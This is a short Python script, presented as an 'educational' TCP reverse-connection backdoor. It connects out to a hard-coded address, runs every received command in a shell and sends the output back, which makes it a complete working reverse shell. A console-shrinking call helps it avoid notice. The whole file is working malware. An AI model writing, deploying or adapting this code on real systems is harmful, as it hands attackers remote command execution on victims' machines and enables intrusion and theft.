#Created for educational purposes by Carlos/cardangi
#I'm not responsible for illegal usage of it.
#TCP Reverse Connection Backdoor


import socket, subprocess, os

os.system("mode 14,1")

def conexao():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Sockets
    s.connect(('192.168.1.7', 8080)) # Change "192.168.1.7" 

    while (True):
        receber = s.recv(1024).decode()

        if 'terminate' in receber:
            s.close()
            break

        else:
            CMD = subprocess.Popen(receber, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Read about subprocess lib.
            s.send ( CMD.stdout.read() )
            s.send ( CMD.stderr.read() )

def principal():
    conexao()
principal()
